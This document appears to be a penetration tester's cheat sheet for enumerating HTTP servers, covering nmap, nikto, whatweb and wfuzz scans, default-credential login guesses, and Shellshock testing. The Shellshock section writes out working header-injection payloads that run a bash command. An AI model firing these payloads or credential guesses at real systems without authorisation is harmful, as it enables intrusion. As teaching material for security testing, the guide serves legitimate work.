# Network Enum: HTTP Servers
## Scans

**Nmap:**
```default
nmap -vv --reason -Pn -sV -p 80,443 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 10.0.0.42
```

**Nikto:**
```default
nikto -ask=no -h http://10.0.0.42:80
nikto -ask=no -h https://10.0.0.42:443
```

**Whatweb:**
```default
whatweb --color=never --no-errors -a 3 -v http://10.0.0.42:80
whatweb --color=never --no-errors -a 3 -v https://10.0.0.42:443
```

## Manual Enum

1. Check **robots.txt** for "hidden" files and dirs
2. Check **SSL/TLS certificates** for subdomains, company names, email addresses, usernames
3. Check **HTTP Response headers** for server name, version and scripting engines (PHP, ASP, etc.)
4. Check **Error pages** (404, 500, 401) for server name, version and scripting engines (PHP, ASP, etc.)

**Google the server name and version for vulnerabilites. Do the same for found scripting engines (PHP version, etc.)**

## Dir Fuzzing






## Subdomain Fuzzing

If you know (or figured out) the host name, then you can look for subdomains that serve different content.

```default
wfuzz -c -Z -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
```

## Login Forms

* admin:admin
* admin:password
* Check for SQL Injections
* Google for default credentials (If you know what it is) 
* Check for "username is wrong" type info leaks
* Search for possible usernames on the wider site ("About Us" pages, ssl cert, etc.)

If you can create a low privilege user, then do so. It helps figuring out the rules of the system like username format, password requirements, etc. Also even low priv users sometimes can see sensitive data.

Also logged in users might have access to vulnerable parts of the website that are otherwise not visible.


### Login Bruteforcing

This is inherently dangerous because it might (1.) blacklist your IP address after too many failed attempts and (2.) it might DoS the target server. So this should be seen as a last resort.

If you do not know some confirmed usernames, then this might take forever. If you really have no clue, then it is advised that you limit the tested usernames to a small set of very common names like "admin", "Administrator", etc. 

It also helps if you know the required username format. For instance if usernames are all email addresses, then you should obviously only test email addresses. Preferably email addresses at the same domain as the website.








## Common Vulns
### Shellshock

If you found a `/cgi-bin/` directory or if you know shell script files are getting interpreted and the output served via HTTP, then you should look for shellshock. 

Nmap has a detection script (covered by the command above), but it is notoriously unreliable. A manual test might be necessary.

Fuzz for script files:
```default
wfuzz -Z -c -w <small_wordlist_without_extensions> -w <common_script_extensions> --hc 404 http://10.0.0.1:10443/cgi-bin/FUZZFUZ2Z
```

Wordlist for common script extensions:
```default
.sh
.js
.py
.cs
.bat
.cfm
.cgi
.jsp
.pl
.rb
```

If you found an interpreted script file, then the basic test looks like this:

/cgi-bin/user.sh

```default
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

Shellshock gets triggered by: `() { :;}; echo; /bin/bash -c "ls /usr/bin"`

Also test the other headers, not just User-Agent.

```default
GET /cgi-bin/user.sh HTTP/1.1
Host: () { :;}; echo; /bin/bash -c "ls /usr/bin"
User-Agent: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Referer: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Connection: close
Accept: */*

```


If there is no output printed, try to ping your own machine.